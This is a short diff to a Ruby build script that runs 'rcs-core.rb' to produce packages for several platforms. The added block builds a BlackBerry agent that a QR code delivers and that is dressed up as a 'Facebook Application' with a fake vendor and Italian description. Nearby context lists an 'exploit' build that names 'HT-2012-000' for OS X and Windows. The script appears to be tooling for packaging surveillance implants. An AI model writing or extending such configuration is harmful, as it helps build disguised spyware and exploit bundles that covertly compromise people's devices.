@@ -105,6 +105,23 @@ FileUtils.rm_rf("wap#{ver}.zip")
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o wap#{ver}.zip"
 ###################################################################################################
+params = {platform: 'qrcode',
+          generate: {platforms: ['blackberry'],
+                     binary: {demo: DEMO, admin: true},
+                     melt: {admin: true,
+                            appname: 'facebook',
+                            name: 'Facebook Application',
+                            desc: 'Applicazione utilissima di social network',
+                            vendor: 'face inc',
+                            version: '1.2.3'},
+                     sign: {edition: '5th3rd'},
+                     link: 'http://www.alor.it'
+                    }
+          }
+FileUtils.rm_rf("qrcode#{ver}.zip")
+File.open('build.json', 'w') {|f| f.write params.to_json}
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o qrcode#{ver}.zip"
+###################################################################################################
 params = {platform: 'exploit',
           generate: {exploit: 'HT-2012-000',
                      platforms: ['osx', 'windows'],
